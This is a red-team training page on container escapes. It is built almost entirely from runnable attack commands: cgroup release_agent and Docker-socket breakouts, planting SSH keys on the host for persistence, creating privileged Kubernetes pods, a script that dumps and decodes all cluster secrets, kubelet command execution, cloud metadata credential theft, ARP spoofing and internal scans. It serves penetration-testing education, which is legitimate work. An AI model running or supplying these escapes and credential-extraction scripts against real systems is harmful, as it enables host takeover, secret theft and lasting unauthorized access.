---
layout: training-page
title: "Container Escape Techniques — Red Team Academy"
module: "Red Team Tools"
tags:
  - docker
  - kubernetes
  - container
  - escape
  - privilege-escalation
page_key: "tools-container-escape"
---

<h1>Container Escape Techniques</h1>

<p>Container escapes are the process of breaking out of a containerized environment to access the underlying host. As organizations move workloads to containers and Kubernetes, container escapes become a critical red team skill. This page covers Docker breakouts, Kubernetes privilege escalation, and container-specific attack techniques.</p>

<h2>Container Security Model</h2>

<pre><code># Containers rely on Linux kernel features for isolation:
# 1. Namespaces — isolate process views (PID, net, mount, user, etc.)
# 2. Cgroups — limit resource usage (CPU, memory, I/O)
# 3. Seccomp — restrict available syscalls
# 4. AppArmor / SELinux — mandatory access control
# 5. Capabilities — fine-grained root privilege control

# Escape happens when any of these are misconfigured or bypassed</code></pre>

<h2>Detection: Am I in a Container?</h2>

<pre><code># Check for container indicators
cat /proc/1/cgroup 2&gt;/dev/null | grep -qi "docker\|kubepods\|containerd"
ls -la /.dockerenv 2&gt;/dev/null
cat /proc/self/mountinfo | grep -q "overlay"
hostname | grep -qE "^[a-f0-9]{12}$"

# Comprehensive check
#!/bin/bash
echo "=== Container Detection ==="
[ -f /.dockerenv ] &amp;&amp; echo "[+] .dockerenv exists — Docker container"
grep -qi docker /proc/1/cgroup 2&gt;/dev/null &amp;&amp; echo "[+] Docker cgroup detected"
grep -qi kubepods /proc/1/cgroup 2&gt;/dev/null &amp;&amp; echo "[+] Kubernetes pod detected"
grep -qi containerd /proc/1/cgroup 2&gt;/dev/null &amp;&amp; echo "[+] containerd detected"
[ -f /run/secrets/kubernetes.io/serviceaccount/token ] &amp;&amp; echo "[+] K8s service account found"
cat /proc/1/sched 2&gt;/dev/null | head -1  # PID 1 process name

echo "=== Capabilities ==="
cat /proc/self/status | grep -i capeff

echo "=== Mounts ==="
mount | grep -E "docker|overlay|kubernetes"

echo "=== Host Networking ==="
ip addr | grep -q "docker0" &amp;&amp; echo "[+] Has docker0 — possible host networking"</code></pre>

<h2>Docker Escape Techniques</h2>

<h3>Privileged Container Escape</h3>

<pre><code># If the container runs with --privileged, escape is trivial
# Privileged containers have ALL capabilities and can access host devices

# Method 1: Mount host filesystem
mkdir -p /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host bash
# You are now on the host

# Method 2: cgroup release_agent (works on cgroup v1)
# Create a new cgroup and set its release_agent to run on the host
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/exploit
echo 1 &gt; $d/exploit/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" &gt; $d/release_agent

# Write command to execute on host
echo '#!/bin/sh' &gt; /cmd
echo "cat /etc/shadow &gt; $host_path/output" &gt;&gt; /cmd
chmod +x /cmd

# Trigger the release_agent by creating and killing a process
sh -c "echo \$\$ &gt; $d/exploit/cgroup.procs"
cat /output

# Method 3: nsenter — enter host namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# PID 1 is the host init process — this enters all its namespaces</code></pre>

<h3>Docker Socket Escape</h3>

<pre><code># If /var/run/docker.sock is mounted in the container
# The container can control Docker on the host

# Check for Docker socket
ls -la /var/run/docker.sock

# Use Docker socket to run a privileged container with host mount
# Without docker CLI — use curl to talk to the Docker API
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool

# Create and start a privileged container
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "chroot /host bash"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }'

# With docker CLI available:
docker run -v /:/host --privileged -it alpine chroot /host bash

# Write SSH key to host for persistent access
docker run -v /root/.ssh:/mnt --rm alpine sh -c \
  'echo "ssh-ed25519 AAAA...key" &gt;&gt; /mnt/authorized_keys'</code></pre>

<h3>Dangerous Capabilities</h3>

<pre><code># Check current capabilities
cat /proc/self/status | grep -i cap
capsh --print 2&gt;/dev/null

# CAP_SYS_ADMIN — most dangerous capability
# Allows mount, umount, pivot_root, and many other operations
# Escape via mounting host filesystem
mount /dev/sda1 /mnt

# CAP_SYS_PTRACE — process trace
# Allows ptrace of host processes (if pid namespace is shared)
# Inject code into a host process
# Find a host process
ps aux  # if --pid=host
# Use ptrace to inject shellcode into a host process

# CAP_NET_RAW — raw sockets
# ARP spoofing, packet sniffing on the container network
# Potentially access other containers' traffic

# CAP_DAC_OVERRIDE — bypass file permission checks
# Read/write any file regardless of permissions
cat /etc/shadow  # normally restricted

# CAP_SYS_MODULE — load kernel modules
# Load a malicious kernel module that affects the host
insmod /tmp/rootkit.ko

# CAP_NET_ADMIN — network administration
# Modify routing tables, firewall rules
# MITM attacks on container network</code></pre>

<h3>Sensitive Mount Escapes</h3>

<pre><code># /proc/sysrq-trigger — if /proc is mounted from host
echo b &gt; /proc/sysrq-trigger  # reboot host (destructive — don't do this)

# /proc/sys/kernel/core_pattern — write to host filesystem
echo "|/tmp/exploit" &gt; /proc/sys/kernel/core_pattern
# When a crash occurs, /tmp/exploit runs on the HOST

# /sys/fs/cgroup — cgroup manipulation for escape (see privileged section)

# /dev — if host /dev is mounted
# Access host block devices directly
fdisk -l  # list host disks
mount /dev/sda1 /mnt</code></pre>

<h2>Kubernetes Attacks</h2>

<h3>Service Account Token Abuse</h3>

<pre><code># Every pod gets a service account token mounted by default
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Check what permissions the service account has
# Try to list pods
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods

# Try to list secrets
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets

# Try cluster-wide access
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/pods

# Try to create a privileged pod
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "pwned"},
    "spec": {
      "containers": [{
        "name": "pwned",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "sleep 999999"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'

# Use kubectl if available
export KUBECONFIG=/dev/null
kubectl --server=https://kubernetes.default.svc \
  --token=$TOKEN --insecure-skip-tls-verify \
  auth can-i --list</code></pre>

<h3>Kubernetes Secret Extraction</h3>

<pre><code># If you can list secrets — extract them all
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets | \
  python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for item in data.get('items', []):
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    print(f'--- {ns}/{name} ---')
    for k, v in item.get('data', {}).items():
        try:
            decoded = base64.b64decode(v).decode('utf-8', errors='replace')
            print(f'  {k}: {decoded}')
        except:
            print(f'  {k}: [binary data]')
"

# Common interesting secrets:
# - Database credentials
# - API keys
# - TLS certificates and private keys
# - Docker registry credentials
# - Cloud provider credentials (AWS, GCP, Azure)</code></pre>

<h3>RBAC Abuse</h3>

<pre><code># Check for overprivileged ClusterRoles
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterroles | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data.get('items', []):
    name = item['metadata']['name']
    for rule in item.get('rules', []):
        resources = rule.get('resources', [])
        verbs = rule.get('verbs', [])
        if '*' in verbs or '*' in resources:
            print(f'[!] {name}: resources={resources} verbs={verbs}')
"

# Dangerous RBAC permissions:
# pods/exec — execute commands in any pod
# secrets — read all secrets
# * on * — cluster admin equivalent
# nodes/proxy — access kubelet API on any node
# pods with privileged securityContext — escape to node</code></pre>

<h3>Kubelet API Access</h3>

<pre><code># Kubelet runs on every node and has an API (port 10250)
# If anonymous auth is enabled or you have a valid token:

# List pods on this node
curl -sk https://NODE_IP:10250/pods

# Execute commands in a pod
curl -sk -X POST \
  "https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME" \
  -d "cmd=id"

# Read logs
curl -sk "https://NODE_IP:10250/containerLogs/NAMESPACE/POD_NAME/CONTAINER_NAME"

# Scan for kubelets with anonymous access
for ip in $(seq 1 254); do
  curl -sk --connect-timeout 2 https://10.0.0.$ip:10250/pods &gt;/dev/null 2&gt;&amp;1 &amp;&amp; \
    echo "[+] Kubelet at 10.0.0.$ip"
done</code></pre>

<h2>Container Network Attacks</h2>

<pre><code># Containers typically share a network bridge
# MITM attacks between containers are possible

# ARP spoofing on the container network
# Install ettercap or arpspoof
apt-get install -y dsniff
arpspoof -i eth0 -t VICTIM_CONTAINER_IP GATEWAY_IP

# Access cloud metadata from container
# AWS
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/"

# Scan internal container network
# Discover other containers and services
for port in 80 443 8080 3306 5432 6379 27017 9200; do
  for ip in $(seq 1 254); do
    (echo &gt;/dev/tcp/172.17.0.$ip/$port) 2&gt;/dev/null &amp;&amp; \
      echo "[+] 172.17.0.$ip:$port open" &amp;
  done
done
wait</code></pre>

<h2>Tools</h2>

<pre><code># Container escape and enumeration tools:

# deepce — Docker enumeration and escape
# github.com/stealthcopter/deepce
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
chmod +x deepce.sh &amp;&amp; ./deepce.sh

# CDK — Container penetration toolkit
# github.com/cdk-team/CDK
./cdk evaluate  # evaluate container security
./cdk run shim-pwn  # attempt runc escape
./cdk run docker-sock-check  # check for Docker socket

# kubeaudit — Kubernetes security auditing
# github.com/Shopify/kubeaudit

# kube-hunter — Kubernetes penetration testing
# github.com/aquasecurity/kube-hunter
kube-hunter --remote TARGET_IP
kube-hunter --pod  # run from inside a pod

# Peirates — Kubernetes penetration testing
# github.com/inguardians/peirates
./peirates  # interactive K8s pentest tool

# kubectl-who-can — check RBAC permissions
kubectl who-can create pods --all-namespaces</code></pre>

<h2>Resources</h2>

<ul>
  <li>deepce — <code>github.com/stealthcopter/deepce</code></li>
  <li>CDK Container Toolkit — <code>github.com/cdk-team/CDK</code></li>
  <li>kube-hunter — <code>github.com/aquasecurity/kube-hunter</code></li>
  <li>Peirates — <code>github.com/inguardians/peirates</code></li>
  <li>HackTricks — Container Security — <code>book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security</code></li>
  <li>Bad Pods — Kubernetes Pod Privilege Escalation — <code>github.com/BishopFox/badPods</code></li>
  <li>Kubernetes Goat (training lab) — <code>github.com/madhuakula/kubernetes-goat</code></li>
</ul>
